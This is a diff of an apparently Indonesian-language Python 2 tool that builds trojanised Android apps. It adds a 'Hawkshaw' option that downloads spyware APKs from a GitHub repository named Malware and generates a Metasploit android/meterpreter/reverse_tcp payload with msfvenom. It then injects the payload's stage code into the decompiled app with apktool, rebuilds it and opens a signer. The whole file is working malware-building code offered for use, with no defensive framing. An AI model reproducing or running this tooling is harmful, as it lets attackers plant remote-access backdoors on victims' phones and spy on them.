@@ -94,21 +94,19 @@ def payload():
 	print hijau+'PLEASE WAIT 5 - 20 Minutes...'
 	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
 	
-def spyphone_V14():
-	print 'script dalam perbaikan' 
-	out()
-	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone_V14.apk && mv -f spyphone_V14.apk Malware/spyphone.apk")
-	os.system("cd Malware && rm -rf payload.apk payload spyphone")
-	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
-	os.system("rm -rf Malware/spyphone.apk")
+def hawkshaw():
+	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/HawkShaw.apk && mv -f HawkShaw.apk Malware/a.apk")
+	os.system("cd Malware && rm -rf payload.apk p a")
+	os.system("cd Malware && apktool d a.apk -o a")
+	os.system("rm -rf Malware/a.apk")
 	payload()
-	os.system("cd Malware && apktool d payload.apk -o payload")
-	os.system("rm -rf Malware/spyphone/smali/com/metasploit/stage")
-	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/")
-	os.system("cd Malware && apktool b spyphone -o spyphone_V14.apk")
-	os.system("cd Malware && rm -rf payload.apk payload spyphone")
+	os.system("cd Malware && apktool d payload.apk -o p")
+	os.system("rm -rf Malware/a/smali/com/metasploit/stage")
+	os.system("mv -f Malware/p/smali/com/metasploit/stage Malware/a/smali/com/")
+	os.system("cd Malware && apktool b a -o HawkShaw.apk")
+	os.system("cd Malware && rm -rf payload.apk p a")
+	os.system('mv -f Malware/a.apk /storage/emulated/0')
 	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
-	os.system('mv -f Malware/spyphone_V14.apk /storage/emulated/0/')
 
 def spyphone():
 	os.system("wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
@@ -178,6 +176,8 @@ def pilmal():
 	else:
 		if zedd == '1':
 			spyphone()
+		elif zedd == '2':
+			hawkshaw()
 		else:
 			print '\x1b[1;91m[!] pilihan salah'
 			os.system('clear')
@@ -188,6 +188,7 @@ def malware():
     logo()
     os.system('figlet Malware |lolcat')
     print '\x1b[1;91m1.\x1b[1;97mSpyphone'
+    print '\x1b[1;91m2.\x1b[1;97mHawkshaw '
     print '\r\x1b[1;91m__________________________________________«Back» '
 
 def logo():      
